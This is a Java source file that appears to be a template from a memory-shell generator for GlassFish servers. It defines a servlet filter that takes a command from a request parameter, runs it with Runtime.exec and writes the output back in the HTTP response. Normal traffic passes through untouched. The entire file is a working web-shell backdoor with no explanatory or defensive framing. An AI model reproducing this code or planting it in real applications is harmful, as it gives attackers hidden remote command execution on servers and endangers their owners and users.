package com.reajason.javaweb.memsell.glassfish.command;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class CommandFilter implements Filter {
    public String paramName = "{{paramName}}";

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest servletRequest = (HttpServletRequest) request;
        HttpServletResponse servletResponse = (HttpServletResponse) response;
        String cmd = servletRequest.getParameter(paramName);
        try {
            if (cmd != null) {
                Process exec = Runtime.getRuntime().exec(cmd);
                InputStream inputStream = exec.getInputStream();
                ServletOutputStream outputStream = servletResponse.getOutputStream();
                byte[] buf = new byte[8192];
                int length;
                while ((length = inputStream.read(buf)) != -1) {
                    outputStream.write(buf, 0, length);
                }
            } else {
                chain.doFilter(servletRequest, servletResponse);
            }
        } catch (Exception e) {
            chain.doFilter(servletRequest, servletResponse);
        }
    }

    @Override
    public void destroy() {

    }
}